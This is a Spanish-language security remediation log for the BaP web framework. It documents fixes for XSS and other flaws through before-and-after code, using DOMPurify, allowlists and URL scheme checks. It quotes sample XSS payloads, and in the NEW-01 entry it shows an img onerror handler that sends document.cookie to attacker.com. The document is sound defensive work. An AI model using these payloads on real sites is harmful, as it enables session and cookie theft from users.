# 🛡️ Log de Correcciones de Seguridad — BaP Framework v2.3.7

> **Referencia:** [security-audit-v2.3.7.md](./security-audit-v2.3.7.md)
> **Inicio:** Junio 2026
> **Metodología:** Corrección iterativa, una vulnerabilidad a la vez, con aprobación previa.

---

## Estado General

| ID | Severidad | Descripción breve | Estado |
|----|-----------|-------------------|--------|
| REG-01 | 🟠 Alta | Sanitizador `sanitizeHTML()` insuficiente (blocklist) | ✅ Corregida en v2.3.8 |
| REG-02 | 🟡 Media | Warning invisible en storage síncrono con `secretKey` | ✅ Corregida en v2.3.8 |
| REG-03 | 🔵 Baja | `ENV_URL` usa `window.location.origin` en runtime | ✅ Aceptada — diseño intencional |
| NEW-01 | 🔴 Crítica | XSS en `bap-notification` via `element.innerHTML` crudo | ✅ Corregida en v2.3.9 |
| NEW-02 | 🟠 Alta | SVG sin sanitizar en `bap-svg-image` | ✅ Corregida en v2.3.9 |
| NEW-03 | 🟠 Alta | `colorMode` sin validación en `bap-header` | ✅ Corregida en v2.3.9 |
| NEW-04 | 🟡 Media | `<img src>` sin validar esquema en `bap-dialog` | ✅ Corregida en v2.3.9 |
| NEW-05 | 🟡 Media | `loginAttempts` sin implementación de rate limiting real | 📋 Deuda técnica |
| NEW-06 | 🟡 Media | `fetch()` sin manejo de errores ni timeout | ✅ Corregida en v2.3.9 |
| NEW-07 | 🟡 Media | CSP `'unsafe-inline'` en `style-src` | 📋 Recomendación |
| NEW-08 | 🟡 Media | `onAuthStateChanged` sin `unsubscribe()` | ✅ Corregida en v2.3.9 |
| NEW-09 | 🔵 Baja | `isMobile()` via `userAgent` (spoofeable) | ✅ Corregida en v2.3.9 |
| NEW-10 | 🔵 Baja | `paramsToQueryParams` sin `encodeURIComponent` | ✅ Corregida en v2.3.9 |
| NEW-11 | 🔵 Baja | Rutas RTDB visibles en bundle (ej: `/allowed_users`) | 📋 Recomendación |

---

## Detalle de Correcciones

---

### ✅ REG-01 — Sanitizador `sanitizeHTML()` reemplazado por DOMPurify

**Severidad:** 🟠 Alta
**Versión:** `v2.3.7` → `v2.3.8`
**Fecha:** Junio 2026

#### Problema
La función `sanitizeHTML()` utilizaba una estrategia de **blocklist** que no cubría todos los vectores XSS modernos:
- SVG animado con event handlers (`<svg><animate onbegin="alert(1)"/></svg>`)
- `data:` URIs en atributos `src` (`<img src="data:text/html,<script>alert(1)</script>">`)
- `xlink:href` con payloads XSS dentro de SVG
- `<meta http-equiv="refresh">` con esquema `javascript:`
- Encoding evasions (`&#x6A;avascript:`, espacios de control intermedios)

#### Solución aplicada
Se reemplazó la implementación propia por **DOMPurify v3.1.7**, librería de referencia industria mantenida por Cure53, que usa una estrategia de **allowlist**: solo pasa lo que está explícitamente permitido, rechazando cualquier vector desconocido por diseño.

1. **`src/_main/i18n.js`**: Import del ES module de DOMPurify desde jsDelivr (versión fijada `@3.1.7`). La función `sanitizeHTML()` fue completamente reescrita para delegar en `DOMPurify.sanitize()` con una allowlist de tags HTML semánticos de formato de texto (`b`, `strong`, `em`, `code`, `a`, `p`, `ul`, `li`, etc.) y atributos inofensivos (`href`, `target`, `rel`, `class`, `alt`, `src`, etc.).

2. **`firebase.json`**: Se extendió la CSP (`Content-Security-Policy`) para incluir `https://cdn.jsdelivr.net` en las directivas `script-src` y `connect-src`, permitiendo que el navegador cargue el módulo ES de DOMPurify sin violaciones de política.

#### Trade-off aceptado
- **Supply chain:** El riesgo de dependencia de CDN externo se mitiga fijando la versión `@3.1.7` y por el CSP que limita los orígenes de scripts a dominios explícitamente listados.
- **SRI hash:** Los imports JS dinámicos de ES modules no soportan SRI en la sentencia `import`. Se recomienda evaluar bundling local de DOMPurify en futuras versiones del pipeline de Gulp.

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_main/i18n.js` | Import de DOMPurify `@3.1.7` desde jsDelivr. Reescritura completa de `sanitizeHTML()` con allowlist |
| `firebase.json` | `script-src` y `connect-src` extendidos con `https://cdn.jsdelivr.net` |

---

### ✅ REG-02 — Warning explícito en punto de llamada de funciones síncronas de storage

**Severidad:** 🟡 Media
**Versión:** `v2.3.7` → `v2.3.8`
**Fecha:** Junio 2026

#### Problema
El aviso `@deprecated` de `encryptData()`/`decryptData()` solo se disparaba cuando el desarrollador llamaba directamente a esas funciones internas. Las funciones de nivel superior `getFromStorage`, `setToStorage` y `updateStorage` las invocaban internamente al recibir `secretKey`, sin emitir ninguna advertencia al consumidor del framework.

#### Contexto de la decisión
La funcionalidad Base64 con `secretKey` se mantiene intencionalmente para casos de uso legítimos que solo requieren control de formato visual del texto almacenado (no cifrado real). Se eligió **no romper la API** con un `Error`, y en cambio hacer visible la advertencia directamente en el punto de llamada.

#### Solución aplicada
Se añadió un `console.warn` explícito al inicio de la rama `secretKey` en las tres funciones síncronas. El mensaje identifica la función por nombre, describe el comportamiento real (codificación Base64, no cifrado AES-GCM) y señala la alternativa segura (`*Async` con PBKDF2/AES-GCM).

```javascript
// Ejemplo en setToStorage():
if (secretKey) {
  console.warn(
    "⚠️ [setToStorage] `secretKey` aplica codificación Base64 (formato visual). " +
    "NO es cifrado criptográfico seguro. Para cifrado AES-GCM usa `setToStorageAsync` con secretKey."
  );
}
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_main/storage.js` | `console.warn` añadido en rama `secretKey` de `getFromStorage`, `setToStorage` y `updateStorage` |

---

### ✅ REG-03 — `ENV_URL` usa `window.location.origin` en runtime

**Severidad:** 🔵 Baja
**Estado:** Aceptada como diseño intencional — sin cambios

#### Justificación
`ENV_URL` resuelve a `window.location.origin` en el navegador para garantizar que las URLs de assets de componentes sean siempre relativas al servidor desde el que se sirve la aplicación. Cambiar esto a un token estático rompería el servidor de desarrollo local cuando el origen difiere del valor configurado en `.env`.

El riesgo documentado (URL de producción visible en el bundle) es bajo en el modelo de amenazas de una SPA pública. Se documenta como comportamiento intencional sin acción requerida.

---

### ✅ NEW-01 — XSS en `bap-notification` via `element.innerHTML` crudo

**Severidad:** 🔴 Crítica
**Versión:** `v2.3.8` → `v2.3.9`
**Fecha:** Junio 2026

#### Problema
El componente `bap-notification` leía `element.innerHTML` del host directamente (sin sanitizar) y lo pasaba a `setConfiguration()`, que lo interpolaba en el template HTML mediante `replaceAll`:

```javascript
// ANTES — bap-notification.js L70
template.innerHTML = setConfiguration(
  element.attributes.type?.value ?? null,
  element.attributes.severity?.value ?? null,
  element.innerHTML,   // ← HTML crudo del host, sin sanitizar
  html
);
```

El mensaje resultaba inyectado en `template.innerHTML` y luego clonado al Shadow DOM via `cloneNode(true)`. Aunque el Shadow DOM encapsula estilos, **no provee protección XSS**: cualquier JavaScript inyectado en el contenido tiene acceso completo al `document` global.

**Ejemplo de explotación:**
```html
<bap-notification type="toast" severity="info">
  <img src="x" onerror="fetch('https://attacker.com/?data='+document.cookie)">
</bap-notification>
```

#### Solución aplicada
Se importó `sanitizeHTML()` desde `i18n.js` (que ya usa DOMPurify como resultado de REG-01) y se aplicó sobre `element.innerHTML` **antes** de pasarlo a `setConfiguration()`.

```javascript
// DESPUÉS — bap-notification.js
import { sanitizeHTML } from "../../_main/i18n.js";

// En createBapNotification():
const safeMessage = sanitizeHTML(element.innerHTML);
template.innerHTML = setConfiguration(
  element.attributes.type?.value ?? null,
  element.attributes.severity?.value ?? null,
  safeMessage,   // ← Sanitizado con DOMPurify allowlist
  html
);
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_components/bap-notification/bap-notification.js` | Import de `sanitizeHTML`. Sanitización del `innerHTML` antes de pasarlo a `setConfiguration()` |
| `src/_main/constants.js` | `APP_VERSION` bumped a `v2.3.9` |
| `package.json` | `version` bumped a `v2.3.9` |
| `README.md` | `v2.3.8` → `v2.3.9` |

---

### ✅ NEW-02 — SVG sin sanitizar en `bap-svg-image`

**Severidad:** 🟠 Alta
**Versión:** `v2.3.9` (misma versión que NEW-01)
**Fecha:** Junio 2026

#### Problema
El componente `bap-svg-image` inyectaba los paths SVG del mapa `icons.js` directamente en `innerHTML` sin ninguna sanitización:

```javascript
// ANTES — bap-svg-image.js
this.innerHTML = `
  <figure ...>
    <svg ...>
      ${images[type][name]}   // ← Contenido SVG sin sanitizar
    </svg>
  </figure>
`;
```

Aunque `icons.js` es estático y controlado por el desarrollador, el patrón era inseguro por diseño: si el mapa de iconos fuera extendido con contenido desde fuentes externas (RTDB, URLs), SVG puede ejecutar JavaScript via event handlers (`onbegin`, `onload`, `onerror` en elementos `<animate>`, `<image>`, `<use>`).

#### Solución aplicada
Se añadió sanitización con `sanitizeHTML()` (que delega en DOMPurify, resultado de REG-01) sobre el contenido SVG antes de la inyección. Además se añadió un JSDoc de advertencia que documenta explícitamente que `icons.js` debe contener **únicamente SVG estático** controlado por el desarrollador.

```javascript
// DESPUÉS — bap-svg-image.js
import { sanitizeHTML } from "../../_main/i18n.js";

// En connectedCallback():
const safeSvgContent = sanitizeHTML(images[type][name]);
this.innerHTML = `<figure ...><svg ...>${safeSvgContent}</svg></figure>`;
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_components/bap-svg-image/bap-svg-image.js` | Import de `sanitizeHTML`. Sanitización con DOMPurify del contenido SVG. JSDoc de advertencia sobre uso exclusivo de contenido estático en `icons.js` |

---

### ✅ NEW-03 — `colorMode` sin validación en `bap-header`

**Severidad:** 🟠 Alta
**Versión:** `v2.3.9` (misma versión que NEW-01/02)
**Fecha:** Junio 2026

#### Problema
El componente `bap-header` leía el atributo `color-mode` directamente sin validar su valor, y lo interpolaba en la plantilla HTML via `replaceAll`:

```javascript
// ANTES — bap-header.js
colorMode: this.hasAttribute("color-mode") ? this.getAttribute("color-mode") : "light",

// En preRender():
html.replaceAll("{color-mode}", props.colorMode)  // ← Sin validar
```

Si `{color-mode}` aparece en un contexto de atributo HTML en la plantilla (ej: `class="{color-mode}"`), un valor como `light" onclick="alert(1)` o `light" style="background:url(https://attacker.com)` escaparía el contexto del atributo, inyectando atributos HTML arbitrarios. Lo mismo ocurría con el valor recuperado desde `localStorage` si este hubiera sido manipulado.

#### Solución aplicada
Se añadió la función `sanitizeColorMode(value)` con una **allowlist explícita** de valores permitidos (`["light", "dark"]`). Cualquier otro valor — incluyendo payloads de inyección — se normaliza silenciosamente a `"light"`. La función se aplica en **dos puntos**:

1. Al leer el atributo `color-mode` del elemento en `connectedCallback()`.
2. Al recuperar el modo guardado desde `localStorage` en `postRender()`, protegiend contra valores manipulados en el almacenamiento local.

```javascript
// DESPUÉS — bap-header.js
const ALLOWED_COLOR_MODES = ["light", "dark"];
function sanitizeColorMode(value) {
  return ALLOWED_COLOR_MODES.includes(value) ? value : "light";
}

// En connectedCallback():
colorMode: sanitizeColorMode(this.getAttribute("color-mode")),

// En postRender():
const savedMode = sanitizeColorMode(localStorage.getItem("bap-color-mode")) || "light";
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_components/bap-header/bap-header.js` | Añadida función `sanitizeColorMode()` con allowlist. Aplicada en `connectedCallback()` y `postRender()` |

---

### ✅ NEW-04 — `<img src>` sin validar esquema en `bap-dialog`

**Severidad:** 🟡 Media
**Versión:** `v2.3.9` (misma versión que NEW-01/02/03)
**Fecha:** Junio 2026

#### Problema
El componente `bap-dialog` ya tenía validación de esquema para los enlaces decodificados de Base64, pero **no para las tres URLs de imagen** que se inyectan directamente como atributos `src` en los `<img>` generados:

```javascript
// ANTES — bap-dialog.js
const leftImg  = props.imageHeaderLeft  ? `<img src="${props.imageHeaderLeft}"  ...>` : "";
const rightImg = props.imageHeaderRight ? `<img src="${props.imageHeaderRight}" ...>` : "";
const detailImg = props.imageDetail     ? `<img src="${props.imageDetail}"      ...>` : "";
```

Un valor como `javascript:alert(1)` o `data:text/html,...` en el atributo `image-header-left` se inyectaba directamente en el atributo `src` sin validación, resultando en un `<img src="javascript:alert(1)">` que algunos navegadores ejecutan, o en un `<img>` con `data:` URI que carga contenido HTML externo.

#### Solución aplicada
Se creó la función `isSafeImageUrl(url)` que valida el esquema de la URL contra una lista de esquemas seguros permitidos. Acepta `https://`, `http://` y rutas relativas (sin `:` ni `//`). Rechaza cualquier otro esquema (`javascript:`, `data:`, `vbscript:`, `blob:`, etc.).

Se aplica sobre los tres atributos de imagen **antes** de generar el markup. Si una URL es rechazada, el `<img>` se omite completamente y se emite un `console.warn` identificando el atributo bloqueado.

```javascript
// DESPUÉS — bap-dialog.js
function isSafeImageUrl(url) {
  if (!url) return false;
  const lower = url.trim().toLowerCase();
  if (lower.startsWith("https://") || lower.startsWith("http://")) return true;
  if (!lower.includes(":") && !lower.startsWith("//")) return true; // relativas/anclas
  return false; // javascript:, data:, vbscript:, blob:, etc.
}

const leftImg = isSafeImageUrl(props.imageHeaderLeft)
  ? `<img src="${props.imageHeaderLeft}" alt="Encabezado Izquierdo" />`
  : "";
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_components/bap-dialog/bap-dialog.js` | Añadida función `isSafeImageUrl()`. Aplicada a las tres URLs de imagen (`imageHeaderLeft`, `imageHeaderRight`, `imageDetail`) con `console.warn` en caso de bloqueo |

---

### ✅ NEW-06 — `fetch()` sin manejo de errores ni timeout

**Severidad:** 🟡 Media
**Versión:** `v2.3.9` (misma versión que anteriores)
**Fecha:** Junio 2026

#### Problema
Los tres puntos del framework que usan `fetch()` para cargar plantillas HTML de componentes no tenían ningún mecanismo de:
- **Timeout:** Una conexión lenta o servidor caído podía dejar el `fetch` colgado indefinidamente sin que el componente notificara el fallo.
- **Validación de `response.ok`:** Un servidor que devolviera HTTP 404 o 500 era procesado como HTML válido (`.then(r => r.text())` lo convierte exitosamente), inyectando la página de error del servidor directamente en el componente.
- **Manejo de errores de red:** Las excepciones de red (sin conexión, CORS bloqueado) se propagaban como rechazos no capturados de promesa, sin mensaje descriptivo.

```javascript
// ANTES — customComponentsRegistration.js
fetch(htmlPath)
  .then((response) => response.text())  // ← HTTP 404/500 tratado como éxito
  .then((html) => { /* inyectar */ })
  .finally(() => { /* postRender */ });  // ← sin .catch(), errores silenciados
```

#### Solución aplicada
Se aplicó el mismo patrón en los tres archivos afectados:

1. **`AbortController` con timeout de 8 segundos:** Si el servidor no responde en 8s, el `fetch` es cancelado y se emite un `console.error` descriptivo.
2. **Validación de `response.ok`:** Si la respuesta HTTP es 4xx o 5xx, se lanza un `Error` con el código de estado antes de intentar procesar el cuerpo.
3. **`.catch()` explícito:** Captura errores de red, timeouts y respuestas inválidas por separado, diferenciando `AbortError` (timeout) del resto.
4. **`clearTimeout` en `.then()` y `.catch()`:** El timer se limpia tan pronto como la respuesta llega, evitando que el abort se dispare después de una respuesta exitosa.

```javascript
// DESPUÉS — aplicado en los 3 archivos
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 8000);

fetch(htmlPath, { signal: controller.signal })
  .then((response) => {
    clearTimeout(timeoutId);
    if (!response.ok) throw new Error(`Error HTTP ${response.status} al cargar ${htmlPath}`);
    return response.text();
  })
  .then((html) => { /* inyectar */ })
  .catch((err) => {
    clearTimeout(timeoutId);
    if (err.name === "AbortError") console.error("Timeout (8s) ...");
    else console.error(err.message || err);
  })
  .finally(() => { /* postRender */ });
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_components/customComponentsRegistration.js` | Fetch central de todos los componentes (excepto bap-notification y bap-loading-state) |
| `src/_components/bap-notification/bap-notification.js` | Fetch independiente del componente de notificaciones |
| `src/_components/bap-loading-state/bap-loading-state.js` | Fetch independiente del componente de estado de carga |

---

### ✅ NEW-08 — `onAuthStateChanged` sin `unsubscribe()`

**Severidad:** 🟡 Media
**Versión:** `v2.3.9` (misma versión que anteriores)
**Fecha:** Junio 2026

#### Problema
En `router.js`, `sessionStartedControl()` registraba un nuevo listener con `onAuthStateChanged` en cada llamada sin cancelar el anterior:

```javascript
// ANTES — router.js
export function sessionStartedControl(route, initSession, redirectionCallbackOnNoSession) {
  // ...
  userSession.onAuthStateChanged(async (user) => { /* ... */ });
  // ← El valor de retorno (función unsubscribe) era descartado
}
```

`onAuthStateChanged()` de Firebase SDK retorna una función que, al llamarse, cancela el listener. Sin guardar y llamar esta función:
- En aplicaciones con navegación dinámica (sin recarga de página), cada visita a una ruta protegida registra un listener adicional.
- Los listeners acumulados siguen ejecutándose aunque el usuario haya navegado fuera de la página, disparando redirecciones o callbacks inesperados.
- Constituye un **memory leak** creciente en SPAs de larga duración.

#### Solución aplicada
Se introdujo la variable de módulo `_unsubscribeAuthListener` que guarda la función de cancelación del listener activo. Al inicio de cada llamada a `sessionStartedControl()`, se verifica si existe un listener previo y se cancela antes de registrar uno nuevo.

```javascript
// DESPUÉS — router.js
let _unsubscribeAuthListener = null;

export function sessionStartedControl(...) {
  // ...
  if (typeof _unsubscribeAuthListener === "function") {
    _unsubscribeAuthListener(); // Cancelar listener anterior
  }
  _unsubscribeAuthListener = userSession.onAuthStateChanged(async (user) => {
    /* ... */
  });
}
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_main/router.js` | Variable `_unsubscribeAuthListener` a nivel de módulo. Unsubscribe del listener previo antes de registrar uno nuevo en `sessionStartedControl()` |

---

### ✅ NEW-10 — `paramsToQueryParams` sin `encodeURIComponent`

**Severidad:** 🔵 Baja
**Versión:** `v2.3.9` (misma versión que NEW-08, mismo archivo)
**Fecha:** Junio 2026

#### Problema
La función `paramsToQueryParams()` construía el query string con interpolación directa sin codificar los valores:

```javascript
// ANTES — router.js
const paramsToQueryParams = (params) => {
  let arrayQueryParams = [];
  for (const name of Object.keys(params)) {
    arrayQueryParams.push(`${name}=${params[name]}`); // ← Sin codificación
  }
  return arrayQueryParams.join("&");
};
```

Un valor con caracteres reservados del query string (`&`, `=`, `#`, `%`) rompería el parseado del lado receptor o permitiría a un valor inyectar parámetros adicionales (ej: un valor `"x&admin=true"` produciría `param=x&admin=true`).

#### Solución aplicada
Se reemplazó la construcción manual por una con `encodeURIComponent()` aplicado tanto a la clave como al valor, usando la API estándar del lenguaje.

```javascript
// DESPUÉS — router.js
const paramsToQueryParams = (params) => {
  return Object.keys(params)
    .map((name) => `${encodeURIComponent(name)}=${encodeURIComponent(params[name])}`)
    .join("&");
};
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_main/router.js` | `encodeURIComponent()` aplicado en clave y valor dentro de `paramsToQueryParams()` |

---

### ✅ NEW-09 — `isMobile()` via `userAgent` (spoofeable)

**Severidad:** 🔵 Baja
**Versión:** `v2.3.9`
**Fecha:** Junio 2026

#### Problema
La función `isMobile()` detectó el tipo de dispositivo únicamente a través de `navigator.userAgent`:

```javascript
// ANTES — util.js
export function isMobile() {
  return /Mobi|Android/i.test(navigator.userAgent);
}
```

`navigator.userAgent` es una cadena de texto que el navegador envía al servidor pero que el propio usuario puede sobrescribir desde las DevTools o mediante extensiones. Un usuario de escritorio que falsifique un UserAgent móvil (o viceversa) podría ver la UI en estado incorrecto, con tamaños de iconos o layouts no diseñados para su resolución real.

Aunque el impacto de seguridad directo es bajo (la función se usa únicamente para adaptar tamaños en `bap-svg-image`), el patrón es una mala práctica que, si se extendiera a otros usos, podría derivar en bypasses de UI con implicaciones mayores.

#### Solución aplicada
Se adoptó `window.matchMedia("(pointer: coarse)")` como señal primaria. Esta media query detecta si el dispositivo tiene un puntero de baja precisión (pantalla táctil), que es una característica física del hardware y **no puede ser falsificada desde JavaScript** en el mismo contexto de ejecución.

El `userAgent` se mantiene como fallback exclusivo para entornos sin API de media queries (Node.js, SSR, contextos headless). Se documenta explícitamente en el JSDoc la limitación inherente de todas las señales client-side y la advertencia de no usar `isMobile()` para decisiones de seguridad.

```javascript
// DESPUÉS — util.js
export function isMobile() {
  // Señal primaria: pointer media query (no falsificable via userAgent)
  if (typeof window !== "undefined" && typeof window.matchMedia === "function") {
    return window.matchMedia("(pointer: coarse)").matches;
  }
  // Fallback para entornos sin matchMedia (SSR, Node, headless)
  return /Mobi|Android/i.test(navigator.userAgent);
}
```

#### Archivos modificados
| Archivo | Cambio |
|---------|--------|
| `src/_main/util.js` | `isMobile()` reescrita con `matchMedia("(pointer: coarse)")` como señal primaria y fallback a `userAgent`. JSDoc extendido con advertencia de limitación |

---

## Deuda Técnica y Recomendaciones


### 📋 NEW-05 — `loginAttempts` sin implementación de rate limiting

**Severidad:** 🟡 Media
**Decisión:** Deuda técnica documentada — sin corrección en esta versión.

`bap.config.json` define `security.loginAttempts: 10` y `constants.js` lo expone como `CONSTANT.AUTH.LOGIN_ATTEMPTS`, pero ningún módulo del framework implementa actualmente un mecanismo que limite los intentos de inicio de sesión usando esta constante.

**Impacto potencial:** Sin rate limiting, un atacante puede realizar intentos de autenticación ilimitados (credential stuffing). Firebase Auth aplica sus propios límites a nivel de proyecto, pero no por usuario/IP individual.

**Acción futura recomendada:** Implementar en `auth.js` un contador de intentos con ventana de tiempo (ej: 15 minutos) usando `CONSTANT.AUTH.LOGIN_ATTEMPTS` como umbral máximo.

---

### 📋 NEW-07 — CSP `'unsafe-inline'` en `style-src`

**Severidad:** 🟡 Media
**Decisión:** Recomendación — no es un problema de diseño del framework en sí.

La directiva `style-src 'unsafe-inline'` permite estilos inline, necesarios actualmente por el uso de atributos `style=""` en componentes como `bap-svg-image`. Eliminarla requeriría mover todos los estilos inline a clases CSS externas.

**Recomendación para el desarrollador:** Si la aplicación maneja datos sensibles o requiere CSP estricto, migrar los estilos inline de los componentes a clases CSS y eliminar `'unsafe-inline'` de la directiva `style-src` en `firebase.json`.

---

### 📋 NEW-11 — Rutas RTDB visibles en bundle

**Severidad:** 🔵 Baja
**Decisión:** Recomendación al desarrollador — por diseño, configurable en `bap.config.json`.

La ruta `/allowed_users` queda visible en el bundle compilado (aunque ofuscada). La seguridad real recae en las **Reglas de Seguridad de Firebase RTDB**, no en la ocultación de rutas.

**Recomendación para el desarrollador:** Usar nombres de rutas no descriptivos en `bap.config.json` (ej: `/au` en lugar de `/allowed_users`) para dificultar la identificación del nodo por ingeniería inversa. Asegurar que las Reglas de Seguridad de RTDB restrinjan correctamente el acceso de lectura/escritura al nodo de whitelist.
